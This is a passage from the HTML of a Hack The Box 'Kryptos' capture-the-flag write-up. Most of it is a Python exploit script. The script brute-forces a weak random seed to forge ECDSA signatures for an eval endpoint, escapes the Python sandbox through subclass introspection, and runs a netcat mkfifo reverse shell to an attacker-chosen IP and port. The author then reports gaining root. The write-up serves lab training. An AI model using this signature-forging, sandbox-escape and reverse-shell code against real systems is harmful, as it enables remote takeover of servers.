<span class="k">def</span> <span class="nf">sign</span><span class="p">(</span><span class="n">sk</span><span class="p">,</span><span class="n">msg</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">binascii</span><span class="p">.</span><span class="n">hexlify</span><span class="p">(</span><span class="n">sk</span><span class="p">.</span><span class="n">sign</span><span class="p">(</span><span class="n">msg</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">brute</span><span class="p">():</span>
    <span class="n">num</span> <span class="o">=</span> <span class="mi">1</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10000</span><span class="p">):</span>
        <span class="n">expr</span> <span class="o">=</span> <span class="s">"1+1"</span>
        <span class="n">seed</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="n">getrandbits</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span> 
        <span class="n">rand</span> <span class="o">=</span> <span class="n">secure_rng</span><span class="p">(</span><span class="n">seed</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span> 
        <span class="n">sk</span> <span class="o">=</span> <span class="n">SigningKey</span><span class="p">.</span><span class="n">from_secret_exponent</span><span class="p">(</span><span class="n">rand</span><span class="p">,</span> <span class="n">curve</span><span class="o">=</span><span class="n">NIST384p</span><span class="p">)</span> 
        <span class="n">vk</span> <span class="o">=</span> <span class="n">sk</span><span class="p">.</span><span class="n">get_verifying_key</span><span class="p">()</span> 
        <span class="n">sig</span> <span class="o">=</span> <span class="n">sign</span><span class="p">(</span><span class="n">sk</span><span class="p">,</span><span class="n">expr</span><span class="p">)</span>
        <span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">'http://127.0.0.1:81/eval'</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s">'expr'</span><span class="p">:</span> <span class="n">expr</span><span class="p">,</span> <span class="s">'sig'</span><span class="p">:</span> <span class="n">sig</span><span class="p">})</span>
        <span class="n">response</span> <span class="o">=</span> <span class="n">req</span><span class="p">.</span><span class="n">text</span>
        <span class="k">if</span> <span class="n">response</span> <span class="o">==</span> <span class="s">"Bad signature"</span><span class="p">:</span>
            <span class="k">print</span> <span class="n">YELLOW</span> <span class="o">+</span> <span class="s">"[-] Attempt "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">num</span><span class="p">)</span> <span class="o">+</span> <span class="s">": failed"</span>
            <span class="n">num</span> <span class="o">+=</span> <span class="mi">1</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">print</span> <span class="n">GREEN</span> <span class="o">+</span> <span class="s">"[+] Found the seed: "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">seed</span><span class="p">)</span>
            <span class="k">return</span> <span class="n">seed</span>
            <span class="k">break</span>

<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">seed</span><span class="p">,</span><span class="n">expr</span><span class="p">):</span>
    <span class="n">rand</span> <span class="o">=</span> <span class="n">secure_rng</span><span class="p">(</span><span class="n">seed</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span> 
    <span class="n">sk</span> <span class="o">=</span> <span class="n">SigningKey</span><span class="p">.</span><span class="n">from_secret_exponent</span><span class="p">(</span><span class="n">rand</span><span class="p">,</span> <span class="n">curve</span><span class="o">=</span><span class="n">NIST384p</span><span class="p">)</span> 
    <span class="n">vk</span> <span class="o">=</span> <span class="n">sk</span><span class="p">.</span><span class="n">get_verifying_key</span><span class="p">()</span> 
    <span class="n">sig</span> <span class="o">=</span> <span class="n">sign</span><span class="p">(</span><span class="n">sk</span><span class="p">,</span><span class="n">expr</span><span class="p">)</span>
    <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">'http://127.0.0.1:81/eval'</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s">'expr'</span><span class="p">:</span> <span class="n">expr</span><span class="p">,</span> <span class="s">'sig'</span><span class="p">:</span> <span class="n">sig</span><span class="p">})</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">:</span>
    <span class="k">print</span> <span class="n">YELLOW</span> <span class="o">+</span> <span class="s">"[-] Usage: {} &lt;seed&gt; &lt;ip&gt; &lt;port&gt; | Or to bruteforce the seed: {} -b &lt;ip&gt; &lt;port&gt;"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
    <span class="nb">exit</span><span class="p">()</span>
<span class="k">else</span><span class="p">:</span>
    <span class="k">if</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">"-b"</span><span class="p">:</span>
        <span class="n">ip</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
        <span class="n">port</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
        <span class="k">print</span> <span class="n">YELLOW</span> <span class="o">+</span> <span class="s">"[*] Bruteforcing the seed."</span>
        <span class="n">seed</span> <span class="o">=</span> <span class="n">brute</span><span class="p">()</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="s">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc "</span> <span class="o">+</span> <span class="n">ip</span> <span class="o">+</span> <span class="s">" "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">port</span><span class="p">)</span> <span class="o">+</span> <span class="s">" &gt;/tmp/f"</span>
        <span class="n">expr</span> <span class="o">=</span> <span class="s">"[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == </span><span class="se">\'</span><span class="s">Pattern</span><span class="se">\'</span><span class="s">][0].__init__.__globals__[</span><span class="se">\'</span><span class="s">__builtins__</span><span class="se">\'</span><span class="s">][</span><span class="se">\'</span><span class="s">__import__</span><span class="se">\'</span><span class="s">](</span><span class="se">\'</span><span class="s">os</span><span class="se">\'</span><span class="s">).system(</span><span class="se">\'</span><span class="s">"</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="s">"</span><span class="se">\'</span><span class="s">)"</span>
        <span class="k">print</span> <span class="n">YELLOW</span> <span class="o">+</span> <span class="s">"[*] Executing payload, check your listener."</span>
        <span class="n">exploit</span><span class="p">(</span><span class="n">seed</span><span class="p">,</span><span class="n">expr</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">seed</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
        <span class="n">ip</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
        <span class="n">port</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
        <span class="k">print</span> <span class="n">YELLOW</span> <span class="o">+</span> <span class="s">"[*] Seed: "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">seed</span><span class="p">)</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="s">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc "</span> <span class="o">+</span> <span class="n">ip</span> <span class="o">+</span> <span class="s">" "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">port</span><span class="p">)</span> <span class="o">+</span> <span class="s">" &gt;/tmp/f"</span>
        <span class="n">expr</span> <span class="o">=</span> <span class="s">"[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == </span><span class="se">\'</span><span class="s">Pattern</span><span class="se">\'</span><span class="s">][0].__init__.__globals__[</span><span class="se">\'</span><span class="s">__builtins__</span><span class="se">\'</span><span class="s">][</span><span class="se">\'</span><span class="s">__import__</span><span class="se">\'</span><span class="s">](</span><span class="se">\'</span><span class="s">os</span><span class="se">\'</span><span class="s">).system(</span><span class="se">\'</span><span class="s">"</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="s">"</span><span class="se">\'</span><span class="s">)"</span>
        <span class="k">print</span> <span class="n">YELLOW</span> <span class="o">+</span> <span class="s">"[*] Executing payload, check your listener."</span>
        <span class="n">exploit</span><span class="p">(</span><span class="n">seed</span><span class="p">,</span><span class="n">expr</span><span class="p">)</span>
</code></pre></div></div>
<p>It takes the ip, port and whether bruteforces the seed or takes the seed as an argument then it spawns a reverse shell.<br>
<br><img src="/images/hackthebox/kryptos/20.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/kryptos/21.png" alt="" class="align-center"><br><br></p>

<p>And we owned root !
<br>That’s it , Feedback is appreciated !
<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer">@Ahm3d_H3sham</a>
<br>Thanks for reading.<br></p>

<p>Previous Hack The Box write-up : <a href="/hack-the-box/luke/">Hack The Box - Luke</a>
<br>Next Hack The Box write-up : <a href="/hack-the-box/swagshop/">Hack The Box - Swagshop</a></p>

        
      </section>

      <footer class="page__meta">
        
        


        

  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-09-21T07:00:00+02:00">September 21, 2019</time></p>


      </footer>

      

      
  <nav class="pagination">
    
      <a href="/hack-the-box/luke/" class="pagination--pager" title="Hack The Box - Luke
">Previous</a>
    
    
      <a href="/hack-the-box/swagshop/" class="pagination--pager" title="Hack The Box - Swagshop
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
</div>
    </div>

    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
    <ul class="social-icons">
      
  
      
  
      
    </ul>
  </div>
      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>







  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-97164925-2', { 'anonymize_ip': false});
</script>









  </body>
</html>
